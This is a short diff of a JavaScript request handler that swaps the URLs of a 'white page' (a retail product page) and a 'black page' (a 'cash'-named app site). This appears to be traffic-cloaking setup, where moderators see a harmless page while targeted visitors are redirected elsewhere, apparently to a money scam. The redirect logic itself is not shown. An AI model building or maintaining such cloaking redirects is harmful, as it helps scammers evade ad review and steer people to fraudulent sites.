@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.albeebaby.com/";
-    const blackPageURL = "https://mintycash.lovable.app";
+    const whitePageURL = "https://vendella.com.au/product/weavers-terry-cotton-slippers-open-toe-100-pack/";
+    const blackPageURL = "https://glowcashlog.lovable.app";
 
     //testing
   
